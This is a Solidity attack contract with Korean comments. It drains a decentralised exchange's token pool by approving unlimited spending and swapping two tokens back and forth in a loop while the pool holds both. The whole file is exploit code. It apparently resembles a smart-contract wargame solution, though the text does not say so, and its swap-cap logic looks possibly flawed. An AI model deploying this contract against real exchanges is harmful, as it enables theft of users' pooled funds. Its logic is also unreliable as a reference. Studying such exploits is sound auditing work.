// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// IERC20 인터페이스 선언
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

// Dex 인터페이스 선언 (swap 함수만 선언)
interface Dex {
    function swap(address from, address to, uint256 amount) external;
}

// 공격 컨트랙트
contract DexAttack {
    Dex public dex;
    address public token1;
    address public token2;

    constructor(address dexAddress, address _token1, address _token2) {
        dex = Dex(dexAddress);
        token1 = _token1;
        token2 = _token2;
    }

    // 공격용 함수
    function attack() public {
        // 공격자는 자신의 토큰을 미리 approve 해둬야 함
        IERC20(token1).approve(address(dex), type(uint256).max);
        IERC20(token2).approve(address(dex), type(uint256).max);

        // Dex 풀에 토큰이 남아있는 동안 반복적으로 swap 실행
        while (IERC20(token1).balanceOf(address(dex)) > 0 && IERC20(token2).balanceOf(address(dex)) > 0) {
            uint256 myToken1 = IERC20(token1).balanceOf(address(this));
            uint256 myToken2 = IERC20(token2).balanceOf(address(this));

            uint256 swapAmount;
            if (myToken1 > 0) {
                // token1 -> token2
                swapAmount = myToken1 < IERC20(token1).balanceOf(address(dex)) ? myToken1 : IERC20(token1).balanceOf(address(dex));
                dex.swap(token1, token2, swapAmount);
            } else if (myToken2 > 0) {
                // token2 -> token1
                swapAmount = myToken2 < IERC20(token2).balanceOf(address(dex)) ? myToken2 : IERC20(token2).balanceOf(address(dex));
                dex.swap(token2, token1, swapAmount);
            } else {
                // 둘 다 잔고가 0이면 종료
                break;
            }
        }
    }

    // 토큰 입금 함수
    function depositTokens(address token, uint256 amount) public {
        IERC20(token).transferFrom(msg.sender, address(this), amount);
    }
}
